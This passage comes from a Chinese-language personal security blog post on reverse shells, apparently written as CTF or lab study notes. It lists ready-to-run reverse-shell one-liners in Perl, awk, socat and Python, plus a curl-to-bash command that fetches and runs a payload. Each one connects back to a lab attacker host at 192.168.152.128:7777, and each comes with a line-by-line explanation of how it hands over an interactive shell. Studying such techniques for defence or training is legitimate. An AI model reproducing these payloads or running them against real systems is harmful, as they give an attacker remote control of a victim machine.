+<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.152.128&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>其实有了前几个反弹的技巧，这个应该也不难看出来：</p>
+<p><code>use Socket;$i=&quot;192.168.152.128&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;))</code>：Perl版本的建桥指令，或者说就相当于php反弹里的fsockopen()，它向kali发起TCP连接，并把这个连接命名为句柄<code>S</code></p>
+<p><code>open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;)</code>：将标准输出标准输入和标准错误重定向到<code>S</code>上 </p>
+<p><code>exec(&quot;/bin/sh -i&quot;)</code>：调用操作系统</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/14.png" class="" width="14">
+
+<h2 id="awk反弹"><a href="#awk反弹" class="headerlink" title="awk反弹"></a>awk反弹</h2><p>awk原本是一个用来处理文件的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;动作&#x27; 文件名</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/15.png" class="" width="15">
+
+<p>此命令将逐行打印flag.txt的内容，其中$0表示整行内容。</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/16.png" class="" width="16">
+
+<p>这里的$n表示第n个字段</p>
+<p>接下来了解了解awk反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.152.128/7777&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><code>BEGIN&#123;&#125;</code>：正常来说awk是等有文件输入了才执行，不过加载BEGIN块之后表示程序一启动就执行括号内的代码</p>
+<p><code>s=&quot;/inet/tcp/0/192.168.152.128/7777&quot;</code>：与<code>/dev/tcp</code>类似，<code>awk</code> 内部同样硬编码了一个特殊的虚拟路径解析器：<code>/inet/网络协议/本地端口/目标IP/目标端口</code>，在给s赋值的同时，awk建立了一个通向kali的TCP握手，0表示本地端口随机</p>
+<p><code>for(;s|&amp;getline c;close(c))</code>：</p>
+<p>​      <code>|&amp;</code>：双向管道符，awk独有，它把套接字s修改为可读写的通道</p>
+<p>​      <code>s|&amp;getline c</code>：如果从kali中传来了命令，就把他读取下来存进变量c中</p>
+<p>​      <code>close(c)</code>：每次执行完命令之后清理执行环境准备执行下一条命令</p>
+<p><code>while(c|getline) print|&amp;s</code>：当c获得命令，awk会将c里的字符串交给操作系统执行并且把执行出来的结果一行行读取出来，<code>print|&amp;s</code>表示把读取到的结果顺着双向管道赋值给<code>s</code></p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/17.png" class="" width="17">
+
+<h2 id="curl反弹"><a href="#curl反弹" class="headerlink" title="curl反弹"></a>curl反弹</h2><p>我们可以将一个shell反弹的payload放在靶机可以执行curl的地方，然后利用管道符和sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.152.128/bash.html|bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/19.png" class="" width="19">
+
+<h2 id="socat反弹"><a href="#socat反弹" class="headerlink" title="socat反弹"></a>socat反弹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.152.128:7777</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/18.png" class="" width="18">
+
+<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.152.128&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>原理其实也和前面的差不多，建立网络连接之后把0,1,2都接上通道</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/20.png" class="" width="20">
+
+<p>文章参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527">反弹shell汇总，看我一篇就够了-CSDN博客</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ZLARYY123.github.io">ZLARYY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://zlaryy123.github.io/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">https://zlaryy123.github.io/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avertar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">文件包含</div></div><div class="info-2"><div class="info-item-1">文件包含本文主要涉及临时文件包含，session文件包含，日志文件包含等特殊的文件包含技巧，除此之外相关伪协议见本博客SSRF各种协议 临时文件包含当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。 关于临时文件我们需要伪造一个POST提交文件的请求包，上传的文件信息会保存在$_FILES里面，$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。我们也可以通过使用var_dump查看$_FILES的内容 123456$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。$_FILES[&#x27;userf...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avertar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZLARYY</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZLARYY123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">低版本php下信息泄露的CVE漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.1.</span> <span class="toc-text">bash反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.</span> <span class="toc-text">nc反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.3.</span> <span class="toc-text">php反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.4.</span> <span class="toc-text">exec反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.5.</span> <span class="toc-text">perl反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.6.</span> <span class="toc-text">awk反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.7.</span> <span class="toc-text">curl反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.8.</span> <span class="toc-text">socat反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.9.</span> <span class="toc-text">python反弹</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/" title="低版本php下信息泄露的CVE漏洞与反弹shell">低版本php下信息泄露的CVE漏洞与反弹shell</a><time datetime="2026-03-12T08:30:00.000Z" title="Created 2026-03-12 16:30:00">2026-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">文件包含</a><time datetime="2026-03-10T13:00:00.000Z" title="Created 2026-03-10 21:00:00">2026-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/28/RCE/" title="RCE">RCE</a><time datetime="2026-02-28T07:45:00.000Z" title="Created 2026-02-28 15:45:00">2026-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/22/SQL/" title="SQL">SQL</a><time datetime="2026-02-22T06:50:00.000Z" title="Created 2026-02-22 14:50:00">2026-02-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">php反序列化</a><time datetime="2026-02-16T04:00:00.000Z" title="Created 2026-02-16 12:00:00">2026-02-16</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ZLARYY</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async data-pjax src="/"></script></div></body></html>
